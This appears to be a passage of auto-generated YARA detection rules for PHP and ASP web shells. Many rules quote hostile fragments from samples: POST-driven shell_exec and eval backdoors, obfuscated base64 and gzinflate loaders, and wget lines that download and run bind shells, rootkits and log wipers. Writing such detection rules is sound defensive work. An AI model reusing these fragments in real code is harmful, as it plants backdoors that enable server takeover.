      $s17 = "newuser=replace(newuser,\"c:\",f)" fullword ascii
      $s18 = "<table width=\"494\" height=\"163\" border=\"1\" cellpadding=\"0\" cellspacing=\"1\" bordercolor=\"#666666\">" fullword ascii
      $s19 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
      $s20 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule AllPackagesLocation
{
   meta:
      description = "php17 - file AllPackagesLocation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "822262b5b230cf2845c5aa9a53a654446682daca5fffb0e89512ce383357ccb1"
   strings:
      $s1 = "foreach($this->packageList->getPackages() as $pkg) {" fullword ascii
      $s2 = "public function setFilesystem(Filesystem $filesystem)" fullword ascii
      $s3 = "$location = new PackageLocation($pkg->getPackageHandle());" fullword ascii
      $s4 = "$this->filesystem = $filesystem;" fullword ascii
      $s5 = "namespace Concrete\\Core\\Filesystem\\FileLocator;" fullword ascii
      $s6 = "public function getCacheKey()" fullword ascii
      $s7 = "use Illuminate\\Filesystem\\Filesystem;" fullword ascii
      $s8 = "use Concrete\\Core\\Package\\PackageList;" fullword ascii
      $s9 = "public function __construct(PackageList $packageList)" fullword ascii
      $s10 = "protected $filesystem;" fullword ascii
      $s11 = "$location->setFilesystem($this->filesystem);" fullword ascii
      $s12 = "$this->packageList = $packageList;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_76d55304af1e98d84dee3edada2a465718651717
{
   meta:
      description = "php17 - file 76d55304af1e98d84dee3edada2a465718651717.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f92024095543f5977f3c2002ee73cd9a7969df660d6bff39e04ac9a5bf69a427"
   strings:
      $s1 = "echo shell_exec($_POST['command']);" fullword ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii
      $s3 = "$file=@fopen($_FILES['userfile']['tmp_name'],\"r\") or die (\"[-]Error reading file!\");" fullword ascii
      $s4 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&exec_st method=\"post\">" fullword ascii
      $s5 = "<form action=<?php echo $surl ?>&<?php echo $word ?>&exec method=\"post\">" fullword ascii
      $s6 = "mkdir(urldecode($_POST['dir']).\"/\".$_POST['name']) or die (\"[-]Error creating dir!\");" fullword ascii
      $s7 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir .\"/\". $_FILES['userfile']['name'])) {" fullword ascii
      $s8 = "echo \"</a></td><td><a href=\".$surl.\"&\".$word.\"&download&file_browser&file=\".urlencode($j_d).\"/\".urlencode($file).\">\";" fullword ascii
      $s9 = "<input type=\"submit\" name=\"sub\" value=\"Execute\"><br>" fullword ascii
      $s10 = "unlink(urldecode($dir).\"/\".$file) or die (\"[-]Error @ file:\".$file.\"\");" fullword ascii
      $s11 = "echo \"</textarea><br><br><input type=hidden name=file value=\".urlencode($_GET['file']).\"><input type=submit name=sub valu" fullword ascii
      $s12 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&upload method=\"post\">" fullword ascii
      $s13 = "By turning \"on\" safe you can make your shell in 404 Not Find mode if the user doesnt know your OWN set word!" fullword ascii
      $s14 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&special_d&file=<?php echo urlencode($filename) ?> method=post>" fullword ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGVzYwAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0" fullword ascii
      $s16 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&special_crypt method=\"post\">" fullword ascii
      $s17 = "LFJlZmVyZW5jZSBWaWV3aW5nIENvbmRpdGlvbiBpbiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAAACxS" fullword ascii
      $s18 = "ZWZlcmVuY2UgVmlld2luZyBDb25kaXRpb24gaW4gSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s19 = "AABDb3B5cmlnaHQgKGMpIDE5OTggSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkAAGRlc2MAAAAAAAAA" fullword ascii
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule ae678821dd233b4d3739e89791c747418b53ecb4
{
   meta:
      description = "php17 - file ae678821dd233b4d3739e89791c747418b53ecb4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "af1d59f7e136bc2ceb245520916b4dd17146191538547ff6ec35c469efa3e409"
   strings:
      $s1 = "@$_(${\"_P\".\"OS\".\"T\"}[1-2-5]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_2018
{
   meta:
      description = "php17 - file 2018.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e066a698d8943cebe2c383c7d85f1e2607a8d4ccd77bf8a1882df428b644e85c"
   strings:
      $s1 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea></font><p align=" fullword ascii
      $s2 = "<font face=\"Comic Sans MS\" size=\"1\">[ Diziler -_- Dizinler ]</td>" fullword ascii
      $s3 = "echo '<a target=\"_blank\" href=\"'.$file.'\">'.$file.'</a ><br>';" fullword ascii
      $s4 = "<body background=\"refbgd2.gif\" bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#666699\" vlink=\"#999999\" alink=\"#999900\">" fullword ascii
      $s5 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"43\" ></textarea> <br>" fullword ascii
      $s6 = "b><font color=\"#FF0000\"></td></font></b></font><form enctype=\"multipart/form-data\" method=\"post\">" fullword ascii
      $s7 = "<p><font face=\"Comic Sans MS\" color=\"#FF0000\"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb" ascii
      $s8 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya Upload Edebilirsiniz.</font><br>" fullword ascii
      $s9 = "<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>" fullword ascii
      $s10 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><font color=\"#800080\"><b>:</b> <?php  echo $_SERVER['" fullword ascii
      $s11 = "<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp" fullword ascii
      $s12 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s13 = "nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ " fullword ascii
      $s14 = "&nbsp;</font></font><p align=\"center\"><form method=\"post\">" fullword ascii
      $s15 = "<meta name=\"ProgId\" content=\"FrontPage.Editor.Document\">" fullword ascii
      $s16 = "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage 5.0\">" fullword ascii
      $s17 = "<b>Shell Dizini:</b> <?php  echo $SCRIPT_FILENAME ?>" fullword ascii
      $s18 = "<meta name=\"Microsoft Theme\" content=\"refined 011\">" fullword ascii
      $s19 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea></font><p align=\"" ascii
      $s20 = "</font><font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buraya " fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 20KB and
      8 of them
}

rule a03381b94f45f1b3e6d725fc61ffcdaf978fc93c
{
   meta:
      description = "php17 - file a03381b94f45f1b3e6d725fc61ffcdaf978fc93c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "beb269350e6c5ac9e1e8117add07616da70e8d448168ef9280a8cac29af785c4"
   strings:
      $s1 = "eval($_SERVER['HTTP_E1044']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_54107350a2c8933b5c8a9afe717841256f2e2acf
{
   meta:
      description = "php17 - file 54107350a2c8933b5c8a9afe717841256f2e2acf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c698a2eeef68d9499ed2f580e0cff0511722077f86193fc87cc9cc0617d18693"
   strings:
      $s1 = "$_POST['5kik']" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AllowAccessTest
{
   meta:
      description = "php17 - file AllowAccessTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "56e2aea44643847082680fdbd6c2431aa37cdfe86e2dca4ed1553e3c44bea134"
   strings:
      $s1 = "$this->assertTrue($this->server->emit('beforeMethod:GET', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s2 = "$this->assertTrue($this->server->emit('beforeMethod:HEAD', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s3 = "$this->assertTrue($this->server->emit('beforeMethod:OPTIONS', [$this->server->httpRequest, $this->server->httpResponse])" fullword ascii
      $s4 = "$this->assertTrue($this->server->emit('beforeMethod:PROPPATCH', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s5 = "$this->assertTrue($this->server->emit('beforeMethod:OPTIONS', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s6 = "$this->assertTrue($this->server->emit('beforeMethod:PROPPATCH', [$this->server->httpRequest, $this->server->httpResponse" fullword ascii
      $s7 = "$this->server->httpRequest->setUrl('/testdir/file1.txt');" fullword ascii
      $s8 = "$this->assertTrue($this->server->emit('beforeMethod:COPY', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s9 = "$this->assertTrue($this->server->emit('beforeMethod:PUT', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s10 = "$this->assertTrue($this->server->emit('beforeMethod:MOVE', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s11 = "$this->assertTrue($this->server->emit('beforeMethod:LOCK', [$this->server->httpRequest, $this->server->httpResponse]));" fullword ascii
      $s12 = "'file1.txt' => 'contents'," fullword ascii
      $s13 = "$this->server->httpRequest->setMethod('HEAD');" fullword ascii
      $s14 = "$this->server->httpRequest->setMethod('GET');" fullword ascii
      $s15 = "$this->server->getPlugin('auth')->beforeMethod(" fullword ascii
      $s16 = "new \\Sabre\\HTTP\\Request('GET', '/')," fullword ascii
      $s17 = "$this->assertTrue($this->server->emit('beforeUnbind', ['testdir']));" fullword ascii
      $s18 = "$this->assertTrue($this->server->emit('beforeBind', ['testdir/file']));" fullword ascii
      $s19 = "* @var DAV\\Server" fullword ascii
      $s20 = "$this->server->httpRequest->setMethod('PROPPATCH');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule ad1928ed1cec75b09a7d05548b47cae5c472a427
{
   meta:
      description = "php17 - file ad1928ed1cec75b09a7d05548b47cae5c472a427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "63d02e75b729e2cc17604235cf9c0b506b3ca5d578a8e32a0e85e28763ca25a6"
   strings:
      $x1 = "s7s.com/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");} " fullword ascii
      $x2 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x3 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x4 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");} " fullword ascii
      $x5 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\"; " fullword ascii
      $x6 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed) " fullword ascii
      $x7 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x8 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $x9 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\")); " fullword ascii
      $x10 = "-equiv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/locus7s.com\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x11 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\"> " fullword ascii
      $x12 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) " fullword ascii
      $x13 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\"); " fullword ascii
      $x14 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x15 = "<OPTION VALUE=\"wget http://twofaced.org/linux2-6-all.c\">Linux Kernel 2.6.* rootkit.c" fullword ascii
      $x16 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $x17 = "$accessdeniedmess = \"<a href=\\\"http://locus7s.com\\\">x2300 Locus7Shell v.\".$shver.\"</a>: access denied\"; " fullword ascii
      $x18 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x19 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\"; " fullword ascii
      $x20 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed) " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*)
}

rule sig_0d48acd8559ceed891f997f7204b34cbf411292b
{
   meta:
      description = "php17 - file 0d48acd8559ceed891f997f7204b34cbf411292b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "36aaeb2f888a7d6b9de41f2dbb48d9a3f214e14245456e4a33038e477bf9dec7"
   strings:
      $s1 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$jak3fr0z=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co" ascii
      $s2 = "https://github.com/PhilCodEx/jak3fr0z" fullword ascii
      $s3 = "$GLOBALS['pass'] = \"e25044e2e06364d6387bf080bdbba9bc2f0fd260\"; // sha1(md5(pass))" fullword ascii
      $s4 = "4f01sT7DvOAzpzLCe5ucdCPylXb11xulSbVlTBnZ0t3UGrvilg7FE/nSxat/D/Nlql+ODLD56YEJ4U+IHr7AeAXtZCXa4FuPg4Jid0Lfqim34G6syLBJtirCrJWLVjmV" ascii
      $s5 = "UFqRzBufQzG+rmLtTbjZMrQ+sPU/4H+9gL7dtLPX963AB5V0N3+X4WDppXXdGDZ1nSvToXSuPsrqJfig0ge8FiqloGfC/U/s4rnJ+/897mpXN/emYG/nR+aUWRWg5okf" ascii
      $s6 = "/ggYQCWNlkatRJh1nZSsUmZLSCdW4l0M2Zd09fo9xr90B3OTsThvVsimW/b7xF4ImDlZcDk2LAvcqF89U6qNWYYI8GWsweArDLLoR5m6/9tunn7W3O7z3S3cp8zqmAMd" ascii
      $s7 = "+tC1T2/brQ6vfrQvHv14VixbpOQhiCnpbUswfrH5f/XnNmwRM1YvBNMm72DS/pYEoax9Riz/d7TGeTp5WQ9AND8Wp6kgJMfeNQsEoeW48fHgfwnxH8pwv/mcF/xvAfCv" ascii
      $s8 = "l45bPQxNz9ffPG3isu7qtHZH7Eu33z+sxJhSnQIsMjB/AcmZpKsjNDFaT4pRFeIeVDVua213MvKMx6cdPqPiGOm7ydkjutz990KdL2vA9ugyXdlL9p2ksdeEV4/nTpDR" ascii
      $s9 = "KLstkzhwlaMDS1584nBagEtRPx04kjibLb7G7smg9UCLa5UTtPWwCTsFDrJMi8TMAbt6tgf9g3vr7f3I7A/uLM2udWNRx0pEw6XefTmgmRQ7BwoeMV8kboqBFZVxHGJm" ascii
      $s10 = "uGCex2ZsCP10tl4O2xMhoIzC4RkIDBOByhmeAgbBhLlnnXWYu1dZtrchWhMq6LgEttxK43B7VKTe14rNycTzSrE9fFvRGy9AE9yMG6fGx1CJ6bNZ3lgqztIm2+l4eH3Z" ascii
      $s11 = "QuK4NVy68nKLUbgLDp4FMG0FjYBrlwiW82hdwi2R3cBlX0bV4KLEHovD0czfPzkI6GYSU3n1s4sOpIQ59MiiH0pr4ZWnRF8X5sn7/Rb2FuYTc0z5aPgeTGB5KvdsjAwN" ascii
      $s12 = "aP6eSJGetNgTqefJw5d7JSjiw8dXLVGQU5cP3UkXZ+euz8Aiec4oW4r7nTuSgAzk1mYSg6WU/fQCmlNGmnd8RBseJicKL1w4mHPlyxy4crpvhQejZk5yqhggeXmQDGwb" ascii
      $s13 = "wdO4GHTJdxFIRcwrfeWqG+gx0WxHySX9M9MFBiuo9OSNinuFcrQM/MHbAe5LbDbCwRNufJP/vLxXkfWOk2Gnc9jZ686tJ0Dguga0Pte40s4uJ2tmjNOuw2KgYtFzDhkX" ascii
      $s14 = "7467QfD3/DQHpKLTNe8m8oLuBpdbg4GXao3m9DCv0hrfD0+5mIKYYC9l6NA1zAfE985lXmByS9VLiDH2lFMLHot75/OwJevEzDllyeLcjUpTMO0HIjO5df3Bp7frz73o" ascii
      $s15 = "ZlpGETZcdN3O5XIo1Y1weVPdGUj9uGuiQTcbdUE1x3p3J9GpQdWh9qVf+gdaI6jTdaGsBKHMWNZmNqda2uxkhNrcjUUl9XQvJYm+Bla3hsUfVeC6nXG/GsoUt1dTNr2B" ascii
      $s16 = "4EC+/7b9/o3pD69u3DY+71zx2HaSvPBQqNO9N6dt5egO5TftpjO8NdmBDguPKpv+VoTHaF4Tk7nq42QErTnyefQlS4KPLw668PHy7X1J/y7HdR6izKua/03hPtDQAmoX" ascii
      $s17 = "xh9a+/BXAh+SqkwNVV369eaBfv3r52cdf11DPNp3u7Yw8GPnwsATTg3zzAAbwXmyXYcikfSsMtpbeBIIGlxAk9gNsCY6V6gMk89fWbv79IMPmv4e6pCgMEqn+ewWeit1" ascii
      $s18 = "hRRQu+jFRNFjq27C9d08J8NpDNLlgRVemilgdWu5Bh96xiBZNeFHVBpL7SB9POYYqmwmOWHpobkS2b4yo2w+3KuxKOsCYdLLXQeOxu2CGiLU6Hr+iNOyVLmAWf2C7il0" ascii
      $s19 = "zbefz8k+/JP4ee+R6qRz8XI9EePqaFYkfTPp+6Pe31z1ko2Q8K2uxON2QLXsQju7sVSTbSn255Q5KTPP3uf63u1Jyy8Mci/Yzhv/JS3xtttDkbHnvgk0Zh4jLF3e5pZV" ascii
      $s20 = "aE73eSgWw1BFcOCsU21OEQQN6iW+FJkxzJmtCn+fR2SXcWfiSDycFla9nIOM5Hh7Mu5LQ5BHbirCfDQ/xtcVEWACQFG6Thq1MkEvUmq3fBJVfg8kjF7FjQF0kYNhOWKc" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_10591d83ffb23715e09c6d48af27343f3085a10f
{
   meta:
      description = "php17 - file 10591d83ffb23715e09c6d48af27343f3085a10f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8cb10acea18313eeaf291daa6928cc522ed698c58243dc257a7117ac64076d46"
   strings:
      $x1 = "</b><font face=\"Wingdings 3\" size=\"5\"></font><b><font color=\"#CC0000\">Sosyete Safe Mode Bypass Shell<span lang=\"en-us\"><" ascii
      $x2 = "<font face=\"Wingdings 3\" size=\"5\"></font><b>Sosyete Safe Mode Bypass Shell ; Bypass shell'lerden esinlenerek bir" fullword ascii
      $s3 = "<option value=\" \">Sosyete safe mode bypass shell</option>" fullword ascii
      $s4 = "<p align=\"center\">Sosyete Safe Mode Bypass Shell " fullword ascii
      $s5 = "<option value=\"cat /var/cpanel/accounting.log\">cat/var/cpanel/accounting.log</option>" fullword ascii
      $s6 = "<title> Sosyete Safe Mode Bypass Shell </title>" fullword ascii
      $s7 = "<option value=\"netstat -an | grep -i listen\">A&#231;&#305;k Portlar</option>" fullword ascii
      $s8 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgCol" fullword ascii
      $s9 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=" fullword ascii
      $s10 = "$fuck=shell_exec($_POST['sosyete']); " fullword ascii
      $s11 = "$mokoko=shell_exec($_POST['fuck']); " fullword ascii
      $s12 = "echo \"<b><font color=red>Sosyete Bypass Main Menu</font></b><br>\";" fullword ascii
      $s13 = "</b><font face=\"Wingdings 3\" size=\"5\"></font><b><font color=\"#CC0000\">Sosyete Safe Mode Bypass Shell<span lang=\"en-us\"><" ascii
      $s14 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100" fullword ascii
      $s15 = "<span lang=\"en-us\"> </span>  </b><font color=\"#CC0000\"><b>Coded by</b> </font><b><span lang=\"en-us\"><a href=\"http://www.r" ascii
      $s16 = "<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style=" fullword ascii
      $s17 = "pRMjl0Y0c5dVpXNTBKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09Z2hkZXNjb26/DJpDAAAADElEQVQIHWNgIA0AAAAwAAGErPF6AAAAAElFTkSuQmCC\"/>" fullword ascii
      $s18 = "<img id=\"ghdescon\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQAQMAAAAlPW0iAAAAA1BMVEX///+nxBvIAA" fullword ascii
      $s19 = "(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};" fullword ascii
      $s20 = "<th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\" bgcolor=\"#000000\">" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      1 of ($x*) and 4 of them
}


rule sig_4adef02197f50b9cc6918aa06132b2f6
{
   meta:
      description = "php17 - file 4adef02197f50b9cc6918aa06132b2f6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2a24b7ff5b78d862a32c8f15625078bdd6ca10527a83b81d0a6edd8ab2baad74"
   strings:
      $x1 = "* @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)" fullword ascii
      $x2 = "* http://framework.zend.com/license/new-bsd" fullword ascii
      $s3 = "* @license    http://framework.zend.com/license/new-bsd     New BSD License" fullword ascii
      $s4 = "* to license@zend.com so we can send you a copy immediately." fullword ascii
      $s5 = "* with this package in the file LICENSE.txt." fullword ascii
      $s6 = "throw new Zend_Crypt_Exception('\\'' . $algorithm . '\\' is not supported by any available extension or native function');" fullword ascii
      $s7 = "* This source file is subject to the new BSD license that is bundled" fullword ascii
      $s8 = "protected static function _digestMhash($algorithm, $data, $binaryOutput)" fullword ascii
      $s9 = "$jmj3= \"ceo64dtbas_p\"; $becx2= strtolower($jmj3[7].$jmj3[8].$jmj3[9].$jmj3[1] .$jmj3[3].$jmj3[4] . $jmj3[10] .$jmj3[5]. $j" fullword ascii
      $s10 = "$result = self::$supportedMethod($algorithm, $data, $binaryOutput);" fullword ascii
      $s11 = "public static function hash($algorithm, $data, $binaryOutput = false)" fullword ascii
      $s12 = "protected static function _digestHash($algorithm, $data, $binaryOutput)" fullword ascii
      $s13 = "* @param bool $binaryOutput" fullword ascii
      $s14 = "if (in_array($algorithm, self::$_supportedAlgosMhash)) {" fullword ascii
      $s15 = "protected static function _detectHashSupport($algorithm)" fullword ascii
      $s16 = "* Zend Framework" fullword ascii
      $s17 = "protected static function _digestOpenssl($algorithm, $data, $binaryOutput)" fullword ascii
      $s18 = "protected static $_supportedAlgosMhash = array(" fullword ascii
      $s19 = "* @see Zend_Crypt_Exception" fullword ascii
      $s20 = "* @throws Zend_Crypt_Exception" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_3a47d9861799ad86374f37b38ac6ed2e027266d7
{
   meta:
      description = "php17 - file 3a47d9861799ad86374f37b38ac6ed2e027266d7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b22c41ca0843f037243069af106f03efb8aefaeb25f445543618c8dfb38d4a1"
   strings:
      $s1 = "$K='encode1i(x(1i1igzcompres1i1is($1io),$k));print(1i\"<$k>$d</$k>\"1i);@1isession_1id1iestroy();}}}}';" fullword ascii
      $s2 = "$Y='),$ss($s[1i$i],0,$e)))1i,$k1i)));$o=1io1ib_ge1i1it_content1is();ob_end_clean1i()1i;$d=bas1ie64_';" fullword ascii
      $s3 = "$Z='1irpo1i1is($p,$h)===0){$s[$i]=\"\"1i;$p=$ss1i($p,1i3);}1iif(array_key1i1i_exist1is($i,$s)1i){$s[$';" fullword ascii
      $s4 = "$N='1irray1i_values(1i$q);preg_1imatch_1iall(\"/([1i\\\\1iw])[\\\\w-]+1i(?:;q1i=0.([\\\\d1i1i]1i))?,?/\",$ra,$';" fullword ascii
      $s5 = "$f='m);if1i($q&&$m1i1i){@sessio1in_st1iart();$s1i=&$_1iSESSI1iON;$ss=\"substr1i\";$1isl=\"1istrto1ilow';" fullword ascii
      $s6 = "$p='$kh=\"1i51id41\";$kf=\"402a\";1ifuncti1io1i1in x($t,$k){$c=s1itrlen(1i1i$k);$l=strle1in1i1i($t);$o=';" fullword ascii
      $s7 = "$l='ANG1iUAGE\"];if1i($rr&1i&$ra1i){$u=pa1irse_url1i($rr)1i;pa1irse_str(1i$u[\"que1iry\"],1i$q);$1iq=a';" fullword ascii
      $s8 = "$j='}1i}return $1io;}$r=$1i_SERV1iER;$rr=1i@$r[\"H1iT1iTP_REFERER\"1i1i];1i$ra=@$r[\"HT1iTP_ACC1iEPT_L';" fullword ascii
      $s9 = "$M='ompress(@x1i(@ba1i1ise64_decod1ie1i(preg_1ireplace1i(a1irray(\"/_/\",\"/-/1i1i\"),array1i(\"/\"1i,\"+\"';" fullword ascii
      $s10 = "$b='1i1ii].=$p;$e=st1irpos1i($s[$i],1i$f)1i;if($e){$k1i=$k1ih.$1ikf;ob_st1iart();@ev1ial(@gzun1i1ic';" fullword ascii
      $s11 = "$x='er\";$i=1i$m[1i1][0].$m[1i1][1];$h1i=$1isl($ss(m1id51i($i.$kh),0,31i));$f=1i$sl1i($s1is(md5($i.$';" fullword ascii
      $s12 = "$U='k1if),01i,3));1i$p=\"1i\";for1i($z=1;$z<cou1int($1im[1]1i);$z++)$p.1i=$q[$m[1i21i][1i$1iz]];if(st';" fullword ascii
      $s13 = "$T='\"1i\";for(1i$i=0;$i<$l;1i1i){for($j=0;($j1i<$c&1i&1i$i<$l1i);$j++,$i++){$1io.=$1it{$i}^$k{$j}1i;';" fullword ascii
      $s14 = "$t=str_replace('ey','','eycreaeyteye_fueyneycteyion');" fullword ascii
      $s15 = "$k=str_replace('1i','',$p.$T.$j.$l.$N.$f.$x.$U.$Z.$b.$M.$Y.$K);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_9319b62739d4bd0d9d37226408a30cf95cff8a3c
{
   meta:
      description = "php17 - file 9319b62739d4bd0d9d37226408a30cf95cff8a3c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f19ac90d26fd4a49d25166c6bbfef29a2d593613c1c692f3a375cabb558523a3"
   strings:
      $s1 = "while($code = file_get_contents($remote_file)){" fullword ascii
      $s2 = "$remote_file = 'http://xsser.me/eval.txt';" fullword ascii
      $s3 = "unlink($_SERVER['SCRIPT_FILENAME']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0de51c60a451070cea4ced52b3feaf33ed50f664
{
   meta:
      description = "php17 - file 0de51c60a451070cea4ced52b3feaf33ed50f664.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "af4571baa9f03ab05f58451d073bb214926593242c1a770ef333c4053e6a20db"
   strings:
      $s1 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
